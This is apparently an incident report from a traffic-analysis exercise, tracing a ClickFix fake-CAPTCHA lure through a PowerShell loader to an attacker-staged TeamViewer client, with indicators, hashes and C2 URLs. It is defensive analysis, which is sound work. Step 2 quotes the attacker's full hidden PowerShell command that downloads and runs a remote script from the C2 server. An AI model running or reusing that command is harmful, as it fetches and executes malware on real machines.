# Incident Report — 2025-01-22 Traffic Analysis Exercise

## Victim host
| Field | Value |
|---|---|
| IPv4 | 10.1.17.215 |
| MAC | 00:d0:b7:26:4a:74 |
| Windows hostname | DESKTOP-L8C5GSJ |
| Domain | bluemoontuesday.com |
| Logged-in user | shutchenson |

Established from DHCP request (frame 1, hostname `DESKTOP-L8C5GSJ`, MAC `00:d0:b7:26:4a:74`, offered `10.1.17.215`), NBNS name registration (`DESKTOP-L8C5GSJ<00>`), ARP binding of `10.1.17.215` to `00:d0:b7:26:4a:74`, and Kerberos `CNameString` = `shutchenson`.

## Malware family
**ClickFix-delivered PowerShell loader that stages TeamViewer for attacker remote-hands-on-keyboard access.** No IDS/Suricata alerts were present in the evidence directory (only the pcap), so **attribution is behavioral, not signature-confirmed**. The behavior (fake-CAPTCHA "verify you are human" lure → clipboard-paste Run-dialog execution → mshta/VBScript scriptlet → obfuscated `IEX(...FromBase64String...)` PowerShell downloader → C2 status beacons reporting `startup shortcut created` and `PS process started` → silent deployment of a portable TeamViewer client) matches the widely-documented **ClickFix → TeamViewer RAT** delivery pattern; this is consistent with, but not conclusively proven to be, DarkGate-class loader activity.

## Infection chain (as observed)
1. `10.1.17.215` resolves and connects (TLS SNI) to `google-authenticator.burleson-appliance.net` (Cloudflare, 104.21.x.x) at t=38.19s, then to `authenticatoor.org` → `82.221.136.26` at t=38.86s — a fake CAPTCHA/"verify you are human" ClickFix lure page.
2. At t=60.30s (frame 5031), host issues `GET http://5.252.153.241/api/file/get-file/264872` with UA `Mozilla/4.0 (compatible; MSIE 7.0; ... Trident/7.0 ...)`, characteristic of `mshta.exe`/COM scriptlet retrieval. The returned object (SHA256 `c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103`) is a `<component><script language="VBScript">` scriptlet that runs:
   `powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1');#URL: https://teams.microsoft.com"` — a decoy launch of Azure/Teams pages to mask the download.
3. Host fetches `GET /api/file/get-file/29842.ps1` (frame 5063, SHA256 `b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded`) — obfuscated `iex ([system.text.encoding]::UTF8.GetString([system.convert]::'FromBase64String'(...)))` PowerShell. A near-identical second-stage script `pas.ps1` (SHA256 `a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e`) was also retrieved from the same server.
4. Host begins polling `http://5.252.153.241/1517096937` (404 responses, hundreds of repeated GETs — beacon/heartbeat), including status-report query strings:
   - `?k=message = startup shortcut created;  status = success;`
   - `?k=script: RunRH, status: OK, message: PS process started`
5. Same C2 IP serves portable TeamViewer components under `/api/file/get-file/`: `TV` (PE32 DLL, SHA256 `3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7`), `TeamViewer` (PE32 GUI exe, SHA256 `904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e`), `Teamviewer_Resource_fr` (PE32 DLL, SHA256 `9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192`).
6. At t≈610s onward, the host initiates genuine TeamViewer network traffic to `master16.teamviewer.com` (185.188.32.26) and repeated `ping3.dyngate.com` DynGate check-ins (`GET /din.aspx?s=...&id=0&client=DynGate&p=10000002`), confirming the dropped TeamViewer client became active and is checking in — giving the attacker interactive remote access to the workstation.

## Indicators of Compromise

**C2 endpoints**
- `5.252.153.241:80` — HTTP host serving all stager/loader/payload files and receiving beacon check-ins (evidence: frames 5031, 5063, 5073+ and hundreds of subsequent `/1517096937` GETs)

**Malicious/lure domains**
- `authenticatoor.org` (→ 82.221.136.26) — ClickFix fake-CAPTCHA lure (TLS SNI, frame 2381)
- `google-authenticator.burleson-appliance.net` (→ 104.21.64.1 etc., Cloudflare) — lure/redirect chain entry point (TLS SNI, frame 2342)
- `appointedtimeagriculture.com` (→ 217.70.186.109) — additional domain contacted immediately preceding the payload fetch (DNS query frame 4938, TLS SNI frame 4949); included as a suspicious-chain indicator though its exact role in the infection could not be confirmed from encrypted traffic alone

**URLs**
- `http://5.252.153.241/api/file/get-file/264872` — VBScript scriptlet stager
- `http://5.252.153.241/api/file/get-file/29842.ps1` — obfuscated PowerShell loader stage 1
- `http://5.252.153.241/api/file/get-file/pas.ps1` — obfuscated PowerShell loader (near-duplicate)
- `http://5.252.153.241/api/file/get-file/TV`, `/TeamViewer`, `/Teamviewer_Resource_fr` — TeamViewer client components staged for attacker remote access
- `http://5.252.153.241/1517096937` and `http://5.252.153.241/1517096937?k=...` — C2 beacon/status-report endpoint

**File names / SHA256 hashes**
| File | SHA256 |
|---|---|
| 264872 (VBScript scriptlet) | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 |
| 29842.ps1 (PowerShell loader) | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded |
| pas.ps1 (PowerShell loader) | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e |
| TV (PE32 DLL) | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 |
| TeamViewer (PE32 exe) | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e |
| Teamviewer_Resource_fr (PE32 DLL) | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 |

## Benign context (not IOCs)
- `login.microsoftonline.com` (20.190.157.15), Windows Update/BITS traffic to `*.delivery.mp.microsoft.com`, `ctldl.windowsupdate.com`, `download.windowsupdate.com`, `www.msftconnecttest.com`, NCSI checks — normal OS/enterprise telemetry.
- Ad-tech/analytics domains seen later in the capture (`doubleclick.net`, `demdex.net`, `liveperson.net`, `owneriq.net`, `3lift.com`, `clarity.ms`, etc.) — general browsing noise, unrelated to the infection.
- `master16.teamviewer.com` (185.188.32.26) and `ping3.dyngate.com` are legitimate TeamViewer infrastructure; they are listed above under the infection chain because the client reaching them was attacker-staged, not because the domains themselves are malicious.

## Summary
User `shutchenson` on `DESKTOP-L8C5GSJ` (10.1.17.215, MAC 00:d0:b7:26:4a:74) was compromised via a ClickFix-style fake CAPTCHA page (`authenticatoor.org`), which tricked the user into executing a hidden PowerShell command that pulled an obfuscated loader from `5.252.153.241`. The loader established beacon check-ins to the same server and silently staged a portable TeamViewer client (downloaded from the same C2), which subsequently connected out to TeamViewer's real infrastructure — giving the attacker interactive remote access to the workstation. No IDS alerts were present to confirm a named signature family; attribution to a specific malware brand is behavioral only.
